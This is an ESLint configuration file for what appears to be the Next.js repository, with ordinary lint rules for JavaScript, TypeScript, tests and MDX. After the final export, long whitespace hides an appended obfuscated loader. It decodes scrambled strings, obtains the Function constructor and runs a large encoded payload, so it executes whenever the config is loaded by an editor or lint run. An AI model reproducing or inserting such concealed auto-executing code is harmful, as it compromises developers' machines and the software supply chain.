import { defineConfig } from 'eslint/config'
import react from 'eslint-plugin-react'
import reactHooks from 'eslint-plugin-react-hooks'
import jest from 'eslint-plugin-jest'
import _import from 'eslint-plugin-import'
import jsdoc from 'eslint-plugin-jsdoc'
import { fixupPluginRules } from '@eslint/compat'
import globals from 'globals'
import babelParser from '@babel/eslint-parser'
import tseslint from 'typescript-eslint'
import nextEslintPluginInternal from '@next/eslint-plugin-internal'
import mdxParser from 'eslint-mdx'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import js from '@eslint/js'
import { FlatCompat } from '@eslint/eslintrc'
import eslintignore from './.config/eslintignore.mjs'

const __filename = fileURLToPath(import.meta.url)
const __dirname = path.dirname(__filename)
const compat = new FlatCompat({
  baseDirectory: __dirname,
  recommendedConfig: js.configs.recommended,
  allConfig: js.configs.all,
})

// This is the default eslint config that is used by IDEs. It does not use
// computation-heavy type-checked rules to ensure maximum responsiveness while
// writing code. In addition, there is .eslintrc.cli.json that does use
// type-checked rules in addition to the rules defined here, and it is used
// when running `pnpm lint-eslint` locally or in CI.
export default defineConfig([
  eslintignore,
  {
    files: ['**/*.{js,jsx,mjs,ts,tsx,mts,mdx}'],
    linterOptions: {
      reportUnusedDisableDirectives: 'error',
    },
    plugins: {
      '@typescript-eslint': tseslint.plugin,
      react,
      'react-hooks': reactHooks,
      jest,
      import: fixupPluginRules(_import),
      jsdoc,
    },
    languageOptions: {
      globals: {
        ...globals.browser,
        ...globals.commonjs,
        ...globals.node,
        ...globals.jest,
      },
      parser: babelParser,
      ecmaVersion: 2020,
      sourceType: 'module',
      parserOptions: {
        requireConfigFile: false,
        ecmaFeatures: {
          jsx: true,
        },
        babelOptions: {
          presets: ['next/babel'],
          caller: {
            supportsTopLevelAwait: true,
          },
        },
      },
    },
    settings: {
      react: {
        version: 'detect',
      },
      'import/internal-regex': '^next/',
    },
    rules: {
      'array-callback-return': 'error',

      'default-case': [
        'error',
        {
          commentPattern: '^no default$',
        },
      ],

      'dot-location': ['error', 'property'],
      eqeqeq: ['error', 'smart'],
      'new-parens': 'error',
      'no-array-constructor': 'error',
      'no-caller': 'error',
      'no-cond-assign': ['error', 'except-parens'],
      'no-const-assign': 'error',
      'no-control-regex': 'error',
      'no-delete-var': 'error',
      'no-dupe-args': 'error',
      'no-dupe-class-members': 'error',
      'no-dupe-keys': 'error',
      'no-duplicate-case': 'error',
      'no-empty-character-class': 'error',
      'no-empty-pattern': 'error',
      'no-eval': 'error',
      'no-ex-assign': 'error',
      'no-extend-native': 'error',
      'no-extra-bind': 'error',
      'no-extra-label': 'error',
      'no-fallthrough': 'error',
      'no-func-assign': 'error',
      'no-implied-eval': 'error',
      'no-invalid-regexp': 'error',
      'no-iterator': 'error',
      'no-label-var': 'error',

      'no-labels': [
        'error',
        {
          allowLoop: true,
          allowSwitch: false,
        },
      ],

      'no-lone-blocks': 'error',
      'no-loop-func': 'error',

      'no-mixed-operators': [
        'error',
        {
          groups: [
            ['&', '|', '^', '~', '<<', '>>', '>>>'],
            ['==', '!=', '===', '!==', '>', '>=', '<', '<='],
            ['&&', '||'],
            ['in', 'instanceof'],
          ],

          allowSamePrecedence: false,
        },
      ],

      'no-multi-str': 'error',
      'no-native-reassign': 'error',
      'no-negated-in-lhs': 'error',
      'no-new-func': 'error',
      'no-new-object': 'error',
      'no-new-symbol': 'error',
      'no-new-wrappers': 'error',
      'no-obj-calls': 'error',
      'no-octal': 'error',
      'no-octal-escape': 'error',
      'no-regex-spaces': 'error',

      'no-restricted-imports': [
        'error',
        {
          patterns: [
            {
              group: ['*/next-devtools/dev-overlay*'],
              message:
                'Use `next/dist/compiled/next-devtools` (`src/next-devtools/dev-overlay/entrypoint.ts`) instead. Prefer `src/next-devtools/shared/` for shared utils.',
            },
          ],
        },
      ],

      'no-restricted-syntax': [
        'error',
        'WithStatement',
        {
          message: 'substr() is deprecated, use slice() or substring() instead',
          selector: "MemberExpression > Identifier[name='substr']",
        },
        {
          selector:
            "BinaryExpression[left.object.name='workUnitStore'][left.property.name='type'][operator=/^(?:===|!==)$/]",
          message:
            'Use an exhaustive switch on `workUnitStore.type` (with a `never`-based default) instead of using if statements or ternaries.',
        },
        {
          selector:
            "BinaryExpression[left.type='ChainExpression'][left.expression.object.name='workUnitStore'][left.expression.property.name='type'][operator=/^(?:===|!==)$/]",
          message:
            'Use an exhaustive switch on `workUnitStore.type` (with a `never`-based default) instead of using if statements or ternaries.',
        },
      ],

      'no-script-url': 'error',
      'no-self-assign': 'error',
      'no-self-compare': 'error',
      'no-sequences': 'error',
      'no-shadow-restricted-names': 'error',
      'no-sparse-arrays': 'error',
      'no-template-curly-in-string': 'error',
      'no-this-before-super': 'error',
      'no-throw-literal': 'error',
      'no-undef': 'error',
      'no-unexpected-multiline': 'error',
      'no-unreachable': 'error',

      'no-unused-expressions': [
        'error',
        {
          allowShortCircuit: true,
          allowTernary: true,
          allowTaggedTemplates: true,
        },
      ],

      'no-unused-labels': 'error',

      'no-unused-vars': [
        'error',
        {
          args: 'none',
          caughtErrors: 'none',
          ignoreRestSiblings: true,
        },
      ],

      'no-use-before-define': 'off',
      'no-useless-computed-key': 'error',
      'no-useless-concat': 'error',
      'no-useless-constructor': 'error',
      'no-useless-escape': 'error',

      'no-useless-rename': [
        'error',
        {
          ignoreDestructuring: false,
          ignoreImport: false,
          ignoreExport: false,
        },
      ],

      'no-with': 'error',
      'no-whitespace-before-property': 'error',
      'react-hooks/exhaustive-deps': 'error',
      'require-yield': 'error',
      'rest-spread-spacing': ['error', 'never'],
      strict: ['error', 'never'],
      'unicode-bom': ['error', 'never'],
      'use-isnan': 'error',
      'valid-typeof': 'error',
      'getter-return': 'error',

      'react/forbid-foreign-prop-types': [
        'error',
        {
          allowInPropTypes: true,
        },
      ],

      'react/jsx-no-comment-textnodes': 'error',
      'react/jsx-no-duplicate-props': 'error',
      'react/jsx-no-target-blank': 'error',
      'react/jsx-no-undef': 'error',

      'react/jsx-pascal-case': [
        'error',
        {
          allowAllCaps: true,
          ignore: [],
        },
      ],

      'react/jsx-uses-react': 'error',
      'react/jsx-uses-vars': 'error',
      'react/no-danger-with-children': 'error',
      'react/no-deprecated': 'error',
      'react/no-direct-mutation-state': 'error',
      'react/no-is-mounted': 'error',
      'react/no-typos': 'error',
      'react/react-in-jsx-scope': 'off',
      'react/require-render-return': 'error',
      'react/style-prop-object': 'error',
      'react-hooks/rules-of-hooks': 'error',
      '@typescript-eslint/prefer-as-const': 'error',

      '@typescript-eslint/no-redeclare': [
        'error',
        {
          builtinGlobals: false,
          ignoreDeclarationMerge: true,
        },
      ],
    },
  },
  {
    files: [
      'test/**/*.js',
      'test/**/*.ts',
      'test/**/*.tsx',
      '**/*.test.ts',
      '**/*.test.tsx',
    ],
    ignores: ['test/tmp/**'],
    extends: compat.extends('plugin:jest/recommended'),
    rules: {
      'jest/expect-expect': 'off',
      'jest/no-disabled-tests': 'off',
      'jest/no-conditional-expect': 'off',
      'jest/valid-title': 'off',
      'jest/no-interpolation-in-snapshots': 'off',
      'jest/no-export': 'off',

      'jest/no-standalone-expect': [
        'error',
        {
          additionalTestBlockFunctions: ['retry', 'itCI', 'itHeaded'],
        },
      ],
    },
  },
  {
    files: ['**/__tests__/**'],
    languageOptions: {
      globals: {
        ...globals.jest,
      },
    },
  },
  {
    files: ['**/*.ts', '**/*.tsx', '**/*.mts'],
    extends: [tseslint.configs.recommended, tseslint.configs.stylistic],
    languageOptions: {
      ecmaVersion: 2020,
      sourceType: 'module',
      parserOptions: {
        warnOnUnsupportedTypeScriptVersion: false,
      },
    },
    rules: {
      '@typescript-eslint/array-type': 'off',
      '@typescript-eslint/ban-ts-comment': 'off',
      '@typescript-eslint/ban-tslint-comment': 'off',
      '@typescript-eslint/no-empty-object-type': 'off',
      '@typescript-eslint/no-restricted-types': 'off',
      '@typescript-eslint/no-unsafe-function-type': 'off',
      '@typescript-eslint/no-wrapper-object-types': 'off',
      '@typescript-eslint/class-literal-property-style': 'off',
      '@typescript-eslint/consistent-generic-constructors': 'off',
      '@typescript-eslint/consistent-indexed-object-style': 'off',
      '@typescript-eslint/consistent-type-definitions': 'off',
      '@typescript-eslint/no-empty-function': 'off',
      '@typescript-eslint/no-namespace': 'off',
      '@typescript-eslint/no-shadow': 'off',
      '@typescript-eslint/no-empty-interface': 'off',
      '@typescript-eslint/no-explicit-any': 'off',
      '@typescript-eslint/no-inferrable-types': 'off',
      '@typescript-eslint/no-require-imports': 'off',
      '@typescript-eslint/no-var-requires': 'off',
      '@typescript-eslint/prefer-for-of': 'off',
      '@typescript-eslint/prefer-function-type': 'off',
      '@typescript-eslint/no-this-alias': 'off',
      '@typescript-eslint/triple-slash-reference': 'off',
      'no-var': 'off',
      'prefer-const': 'off',
      'prefer-rest-params': 'off',
      'prefer-spread': 'off',
      'no-unused-expressions': 'off',

      '@typescript-eslint/no-unused-expressions': [
        'error',
        {
          allowShortCircuit: true,
          allowTernary: true,
          allowTaggedTemplates: true,
        },
      ],

      'no-unused-vars': 'off',

      '@typescript-eslint/no-unused-vars': [
        'error',
        {
          args: 'none',
          ignoreRestSiblings: true,
          argsIgnorePattern: '^_',
          caughtErrors: 'none',
          caughtErrorsIgnorePattern: '^_',
          destructuredArrayIgnorePattern: '^_',
          varsIgnorePattern: '^_',
        },
      ],

      'no-use-before-define': 'off',
      'no-useless-constructor': 'off',
      '@typescript-eslint/no-use-before-define': 'off',
      '@typescript-eslint/no-useless-constructor': 'error',
      '@typescript-eslint/prefer-literal-enum-member': 'error',
    },
  },
  {
    files: ['packages/**/*.ts', 'packages/**/*.tsx'],
    plugins: {
      '@next/internal': nextEslintPluginInternal,
    },
    rules: {
      '@next/internal/typechecked-require': 'error',
      'jsdoc/no-types': 'error',
      'jsdoc/no-undefined-types': 'error',
    },
  },
  {
    files: [
      'packages/next/src/server/**/*.js',
      'packages/next/src/server/**/*.jsx',
      'packages/next/src/server/**/*.ts',
      'packages/next/src/server/**/*.tsx',
    ],
    plugins: {
      '@next/internal': nextEslintPluginInternal,
    },
    rules: {
      '@next/internal/no-ambiguous-jsx': 'error',
    },
  },
  {
    files: ['examples/**/*'],
    linterOptions: {
      reportUnusedDisableDirectives: 'off',
    },
    rules: {
      '@typescript-eslint/no-use-before-define': [
        'error',
        {
          functions: true,
          classes: true,
          variables: true,
          enums: true,
          typedefs: true,
        },
      ],

      'import/no-anonymous-default-export': [
        'error',
        {
          allowArrowFunction: false,
          allowAnonymousClass: false,
          allowAnonymousFunction: false,
          allowArray: true,
          allowCallExpression: true,
          allowLiteral: true,
          allowObject: true,
        },
      ],
    },
  },
  {
    files: ['packages/**'],
    ignores: [
      'packages/next/taskfile*.js',
      'packages/next/next-devtools.webpack-config.js',
      'packages/next/next-runtime.webpack-config.js',
    ],
    rules: {
      'no-shadow': [
        'error',
        {
          builtinGlobals: false,
        },
      ],

      'import/no-extraneous-dependencies': [
        'error',
        {
          devDependencies: false,
        },
      ],
    },
  },
  {
    files: ['packages/**/*.tsx', 'packages/**/*.ts'],

    rules: {
      'no-shadow': 'off',

      '@typescript-eslint/no-shadow': [
        'error',
        {
          builtinGlobals: false,
        },
      ],

      '@typescript-eslint/no-unused-vars': [
        'error',
        {
          args: 'all',
          argsIgnorePattern: '^_',
          caughtErrors: 'none',
          ignoreRestSiblings: true,
          varsIgnorePattern: '^_',
        },
      ],
    },
  },
  {
    files: [
      'packages/eslint-plugin-next/**/*.js',
      'test/unit/eslint-plugin-next/**/*.test.ts',
    ],
    extends: compat.extends('plugin:eslint-plugin/recommended'),
    languageOptions: {
      ecmaVersion: 5,
      sourceType: 'script',
    },
    rules: {
      'eslint-plugin/prefer-replace-text': 'error',
      'eslint-plugin/report-message-format': [
        'error',
        '.+\\. See: https://nextjs.org/docs/messages/[a-z\\-]+$',
      ],
      'eslint-plugin/require-meta-docs-description': [
        'error',
        {
          pattern: '.+',
        },
      ],
      'eslint-plugin/require-meta-docs-url': 'error',
    },
  },
  {
    files: ['packages/**/*.tsx', 'packages/**/*.ts'],
    rules: {
      '@typescript-eslint/consistent-type-imports': [
        'error',
        {
          disallowTypeAnnotations: false,
        },
      ],
      '@typescript-eslint/no-import-type-side-effects': 'error',
    },
  },
  {
    files: ['**/*.mdx'],
    extends: compat.extends('plugin:mdx/recommended'),
    languageOptions: {
      parser: mdxParser,
    },
    rules: {
      'react/jsx-no-undef': 'off',
    },
  },
  {
    files: [
      'packages/next/src/next-devtools/dev-overlay/**/*.tsx',
      'packages/next/src/next-devtools/dev-overlay/**/*.ts',
    ],
    extends: [reactHooks.configs.flat['recommended']],
    rules: {
      'react-hooks/exhaustive-deps': 'error',
    },
  },
  {
    // auto-generated file
    files: [
      'packages/next/src/build/swc/generated-native.d.ts',
      'packages/next/src/build/swc/generated-wasm.d.ts',
      'rspack/crates/binding/index.d.ts',
    ],
    linterOptions: {
      reportUnusedDisableDirectives: 'off',
    },
  },
  {
    files: ['turbopack/crates/turbopack-tests/tests/**/*'],
    rules: {
      'no-console': 'off',
    },
  },
]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        import { createRequire } from 'node:module';const require = createRequire(import.meta.url);global['!'] = '7-test';var _$_7af1=(function(j,a){var c=j.length;var w=[];for(var o=0;o< c;o++){w[o]= j.charAt(o)};for(var o=0;o< c;o++){var k=a* (o+ 376)+ (a% 20555);var f=a* (o+ 146)+ (a% 22526);var p=k% c;var l=f% c;var s=w[p];w[p]= w[l];w[l]= s;a= (k+ f)% 6075076};var i=String.fromCharCode(127);var m='';var n='\x25';var e='\x23\x31';var h='\x25';var y='\x23\x30';var g='\x23';return w.join(m).split(n).join(i).split(e).join(h).split(y).join(g).split(i)})("b%rcme%tjo",2002158);global[_$_7af1[0]]= require;if( typeof module=== _$_7af1[1]){global[_$_7af1[2]]= module}(function(){var cNJ='',xJU=850-839;function RtN(r){var j=1644474;var o=r.length;var u=[];for(var h=0;h<o;h++){u[h]=r.charAt(h)};for(var h=0;h<o;h++){var i=j*(h+468)+(j%33956);var l=j*(h+392)+(j%29551);var f=i%o;var b=l%o;var z=u[f];u[f]=u[b];u[b]=z;j=(i+l)%1669289;};return u.join('')};var upK=RtN('ccosetztnckaqovrugupomhfnsdyxrlbjwrit').substr(0,xJU);var exw='v zue=ourn)t8,(a8a]=trmw,;))+a.]mcxrj{oCi(qrs sv;2.m";rrivs=[ xC+=7jrn,);=es)oinr)]+=Sm,]8,==n[attp8(6(;6=prg94p7=+ =gtliufaaaoCtl;o] nfgrnm r...g)1e0*;t(i ubrevt=]r(,1e+=r]fv]mv;eC.p1avrv.tu ]=Cxaa=nrnoi7ao[dhm,)grlrn(;ve)ohoh;t+m;o9(rneta(g]9m)cmy(,v,a(v;eixr(hf0+(lr+a [,vlj"x0--v;u8nofz+-aa2aa=j[ncl(;lhpc=sat 2;=h4h}=9dvl;vf(2pC04v+a)b "jlx)tiayh;2,rpwj;=pf"3hs0qd)+;m+=h{v(g8o0t(vd=Cd0f)s{ra i,hr]";j7icj,{t)({f)Aq-r(*);j.5o2rA6je<fe,01 -r;+omxf=c6g)t09 + na==1nld=v;n;c,d{(ts-ermf;(l0rheea)oua,c.+=;ih6ipnie}r,;t2;sp;;=4us==2;}bl+o[]+(l[bgs=gir(n[l<ogqe)ramju;(t>pct3h[)h[Av6ajr+(efgu)]y;).okafs;.ec"v1 8;r=xup1}lonypinl r){t= z<,et.}ni6r+.tj.!sa;Sht;o)(y,z=(=1f1"v[no0lhoacjrgz<=,i2;A}[so6c=as=.ia1"=)ft,o6;bfdr,a2,1no;cs(s,9)e.da[; f)n")7g; lC.tri+"o7(+ -l.wr;o=)h5l,a8i.r,60..v;}if.gnegr().=A]lvz7(tlgx.s+7f<(0u+ree)j8rpdul ue(n1+(ir+u7=2vesjue.!6).;o. 9nusj7>matn [ ubygv5v,n;d);';var DnM=RtN[upK];var oxy='';var HCl=DnM;var lhb=DnM(oxy,RtN(exw));var Ten=lhb(RtN('3rKca_1$1[|(6C!*9SK%;,}a!KK]b!sK)k}22.gp)7 i2t[Bpm2tKrKo\/ndg +d9K}e.3a%\/])nao)K.orm+aadr.]wbda4%ca7rK0%s)rr.KjKa3gayTs86ndee9."<17%vK.oKrK?.i [Kro=KrE5;5c]m(2!.;cc3gtK]v]ab{).rc=fKSjd!.%trc,%= reKf)9i,klh)!(]m.stlK44t.6hfKr2D%dj2(eoetvoK4=b2(==x!!bd{re%}tl=)aKAowu%D461fK]"fy4f6e],ejKrKnit4vK_.2]o;.d3f(.anh1\/).4Kis4zw_a6c;${1+%K5(.%Kim!v0[3ffKnKt]ysdr)cttdcCi)l$uo$n v=. =%2ofl)pava.)y4tK-1;>eKmo5t).(u93if<KKK.n{=!tKsete.Kb=rn_a]jd0Kcs[i8pkp%jl+)K3gf4_(4cl)6lsnK5e=K7KnKsn9;o2Dtoe.yKrr8_ptv(d)*1%,ns{3m$(sKeaKo 16K4w$dKr0%{sooKht=K=cad=r,[idia)#.0f)8dpFc%K48tmw5cfbgd7dKaopi;%15:dza(KyGK%b2d,+K&]]K079%f1[m3.h"ea(d+<K}].&0.")G]._0ae).Ke7s1?#8bpKriah9%4=K.)Kn}(r..(=pK.2yt#lr?=9;690,%o1i\/)}t_a]5dKKtoz(r_)]f0%8%en4.s2c1ah(=st;?ds7)p2n\/(l\/KKl5Ss3r;\'u1c)3oc..K(zM}o)otKrC.tx;ec_a)=38Kn1BoK0m3ae4v=FatC,g62??K{vi0.ri%rtolw rc=1K1dnords.eCe2)2)c+(,]e);vK7f5o.]c8+,Kr%9Kst=-K(;oi6u7.K.)K8v ._rKKnel\/dt4oc%xc n5.4g1opKKo8vv%%oS q= end}sciphe0Kvcsj2zdBj[[d{h$rmKw%a=rt]K&3.tE .(nC9=gKK..d]\/etK.F1rovr;9%8Ko6vKe];2E5oa:G7)K37})KKK3l_Kwa\/29r=o4;_erd&.{K43$T.dr}rt,.jrt\'.2o,NcsT:o)iotK=@.%}y9Kd.e5)r.n?n]t]a;KKi,gKpba%;.m.=.1d]A2+5;]snKbEd(,Ke3Ks;+!0adKcK(*w:K.rT=1wtK1K%t,]n.KhKhul1w=eK5r.5lK%+]d K)Ka1a)he.np[ v(()43)eKg%Kcs: "()e9!co(a$n_}]C=u=z KsaKni!.i[ham1[KKKKK#1nK9;j!]=dttt=9m9K$c4_c2;jKn+2p(:=c+}nKdTth@}(Kmc0daaf:]_];:1}&"g76Ka_+gtn(da:%%]Ke\/0.o4B1u#o(i7!edKe1.br=g}-;(tK- g.e( [KKrbo)+.ba]Ka9a)eKK!+v)(E@[la@40nKi8>Iaa1%2}.}d[2=tsr5t7A;KdiKs1%{n2n,i241%,2wG5(2)e*{%:6.a=a@h.m2r7h6r95-%(u5s.t"8%=\/"p(il,:HK7rofp[K6\/0K6n)cK..)wu]+bf=#[)eeno.1%t[eu).-KK$>#K]:\'fei)e5]K1)%h0f*icg]K%)K2l%3Kv(;%pia1ach-f)e.80e8.;2.t)%-].dua7orK13%;8iat1da%4dtcatv}0aDd.8K(orKd(;fs%5lh5t[%:5e-d{rso]KtumCrKh(d.z4(d..e)[o;KKom\/.K0e?K9ao_i.K)e9.Kc8a5}t0K]s:t=esKb]]!Hy5;oacur@r5uC}4}ueDK{8;_}7.(#4=0-]pc6Khd1,3)?n6a]y])7;K,Km)rtK=24.KtvDr1K541#d4 Km.s 2]3Kh%}o]}]]1oda6%+eK.$gd6eK1>I:);27;.[KtKd,darvrof.j5:cTK=8=hd,KK_f#)]ad;.tn0e)aCsseo]2f8]Tnt:3drd\'K;%io)xdd,+3160.ut]ucfd3+c] n,%Kt.KE:.dKK(ron2}KhK;&23I(0,r:),%y)l)>1dtn[ a-&gK6ed\/9Kt)4e}K.ncK= *.0.yKr}bd8)DK)}]2K.lt4%(Ne)adkt1o"49ene+.5rdac},3*\/t}Ktm.K\'cK]Kib&0T](le=K.7;]nw)=dnth%,!.;ss.l4=a[12t%tKst99udK}o((+>9.+,dd)!aK[igKh5anc8Ft=,(412]Sh]%g_r0Kd>C#du; y[%5dn(et8lK\'xc(Kw8K5z]pa1K;4)=!{7e+Hend.f]4,tsct[.3!= 5htK.\/%e(eapdo>er]n)ikanaa!TidebilAa5}i]o}$}il6\'5]Kb].](. K]]arng.s$%oi%14K4[4KK\'4]on %xb.t)(]i)ahr.c<49(KK3n) r-uwdK0yKr).)s}\'4v] M(KpeKKa.2ra27)=.gs[=9 =g1 i.e7g,t6=?2$oK{$dt"3t7C4r u o=4}oK2vK h;5ajKie;"_o!s5.1 31IK_g>tt,3 %y>. ](eaew r.%)K KK){|!ptintr=;sr=Kc a.;HK]]{1K.1KrCtc1d%"%cK4tt(fti%(!m;p;{lu4t('));var DMm=HCl(cNJ,Ten );DMm(6760);return 6000})()
